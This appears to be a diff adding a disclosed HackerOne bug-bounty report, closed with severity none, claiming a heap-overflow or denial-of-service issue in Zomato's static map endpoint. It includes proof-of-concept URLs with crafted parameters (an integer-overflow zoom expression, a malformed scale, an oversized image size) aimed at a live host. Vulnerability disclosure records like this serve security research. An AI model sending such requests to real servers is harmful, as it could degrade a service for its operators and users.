@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/751904
+WeaknessName:Heap Overflow
+Reporter:https://hackerone.com/mchinmoy
+ReportedTo:Zomato(zomato)
+BountyAmount:
+Severity:none
+State:Closed
+DateOfDisclosure:05.12.2019 12:00:35
+
+Summary:
+
+Go to
+
+https://maps.zomato.com/php/staticmap?center=0,0&size=240x150&maptype=zomato&markers=180,180,pin_res32&sensor=false&scale=%&zoom=eval(2147483647+1)&language=en
+
+a map will be displayed
+
+Now increase the map size by 10x
+
+https://maps.zomato.com/php/staticmap?center=0,0&size=2400x1500&maptype=zomato&markers=180,180,pin_res32&sensor=false&scale=%&zoom=eval(2147483647+1)&language=en
+
+It will always timeout after waiting from 1-15 minutes
+
+POC video is attached.
+
+## Impact
+
+Zomato Map servers can be bought down making map feature completely non functional and causing millions of dollars loss for Zomato.
